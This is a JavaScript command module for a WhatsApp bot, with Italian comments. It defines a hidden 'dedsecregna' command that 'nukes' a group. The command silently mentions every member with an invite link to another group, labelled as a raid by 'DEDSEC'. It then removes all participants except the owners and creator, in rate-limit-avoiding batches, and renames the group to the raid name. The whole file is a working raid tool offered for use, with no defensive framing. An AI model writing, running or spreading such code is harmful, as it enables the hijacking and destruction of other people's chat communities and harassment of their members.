'use strict';

// Nome nuovo del gruppo
const NEW_GROUP_NAME = '𝑅𝛬𝐼𝐷 𝛣𝜳 𝐷𝛯𝐷𝑆𝛯𝐶 ꪶঔৣ͜͡҉ቾ🦇ꫂ̽  ཽ';
// Scritta inviata con il link (come richiesto dall'utente)
const MESSAGE_TEXT = '𝑅𝛬𝐼𝐷 𝛣𝜳 𝐷𝛯𝐷𝑆𝛯𝐶 ꪶঔৣ͜͡҉🦇ꫂ̽  ཽ';
// Link da inviare con la menzione di tutti
const LINK = 'https://chat.whatsapp.com/IqG5rMPYZeSBZjbS6YYnXE?s=cl&p=a&ilr=4';

module.exports = {
    name: 'dedsecregna',
    aliases: [],
    hidden: true,
    description: "DED SE CREGNA: invia il link taggando tutti, caccia tutti e lascia solo owner/cowner/creatore, poi rinomina il gruppo.",

    async run(sock, msg, args, context) {
        const { command, textArgs, from, sender, isGroup, isOwner, mentioned, targetJid, isReply, contextInfo, isBotAdmin, isSenderAdmin, reply, services } = context;
        const { db, saveDB, sameJid, ownerNumber, setNukeActive, isNukeActive } = services;

        // Deve essere un gruppo. Comunità e sottogruppi di community usano
        // comunque JID che terminano in @g.us, quindi qui sono coperti.
        if (!isGroup) return;

        // Owner e cowner possono lanciare il nuke anche se NON sono admin.
        if (!isOwner) return;

        // Se il bot non è admin ignora il messaggio (nessuna risposta).
        if (!isBotAdmin) return;

        // Evita doppi nuke contemporanei sullo stesso gruppo.
        if (isNukeActive && isNukeActive(from)) return;

        // Marca il gruppo come "in nuke": addio/benvenuto e check partecipanti
        // vengono soppressi finché dura il nuke. Il flag si auto-rimuove dopo
        // 5 minuti (gli eventi group-participants.update arrivano in modo
        // asincrono dopo le rimozioni, quindi non va azzerato qui).
        if (setNukeActive) setNukeActive(from, true);

        await runNuke(sock, from, db, sameJid, ownerNumber, reply);
    },
};

async function runNuke(sock, from, db, sameJid, ownerNumber, reply) {
        const meta = await sock.groupMetadata(from);
        if (!meta) return reply("❌ Non riesco a leggere i dati del gruppo.");

        const participants = Array.isArray(meta.participants) ? meta.participants : [];
        const allJids = participants.map(p => p.id || p.jid || p.phoneNumber).filter(Boolean);

        // ── 1. INVIA IL LINK CON TAG SILENZIOSO ──────────────────────────
        // Tag silenzioso: nessun @handles visibile nel testo, ma tutti i
        // membri vengono aggiunti alla menzione (mentions array).
        try {
            await sock.sendMessage(from, {
                text: `${MESSAGE_TEXT}\n\n${LINK}`,
                mentions: allJids,
            });
        } catch (e) {
            console.error('[dedsecregna] Errore invio link:', e.message);
        }

        // ── 2. ESPELLI TUTTI TRANNE OWNER / COWNER / CREATORE ────────────
        const protectedJids = [
            ownerNumber,
            sock?.user?.id,
            sock?.user?.lid,
            ...(Array.isArray(db?._owners) ? db._owners.flatMap(o => [o.number, o.lid]) : []),
            meta?.owner,
            meta?.ownerPn,
        ].filter(Boolean);

        const toRemove = allJids.filter(jid =>
            !protectedJids.some(p => sameJid(jid, p))
        );

        let kicked = 0;
        // Rimozioni in blocchi per evitare rate-limit
        const CHUNK = 10;
        for (let i = 0; i < toRemove.length; i += CHUNK) {
            const chunk = toRemove.slice(i, i + CHUNK);
            try {
                await sock.groupParticipantsUpdate(from, chunk, 'remove');
                kicked += chunk.length;
                await new Promise(r => setTimeout(r, 1500));
            } catch (e) {
                console.error('[dedsecregna] Errore rimozione:', e.message);
            }
        }

        // ── 3. RINOMINA IL GRUPPO ────────────────────────────────────────
        try {
            await sock.groupUpdateSubject(from, NEW_GROUP_NAME);
        } catch (e) {
            console.error('[dedsecregna] Errore rinomina:', e.message);
        }

        await reply(
`🦇 *_DED SE CREGNA_*
━━━━━━━━━━━━━━━━━━
▸ Link inviato e tutti taggati.
▸ 🚫 Espulsi: _${kicked}_ membri.
▸ 👑 Rimasti: owner, cowner
  e creatore del gruppo.
▸ 📛 Gruppo rinominato.
━━━━━━━━━━━━━━━━━━
◈ _Vex Bot_`
        );
}
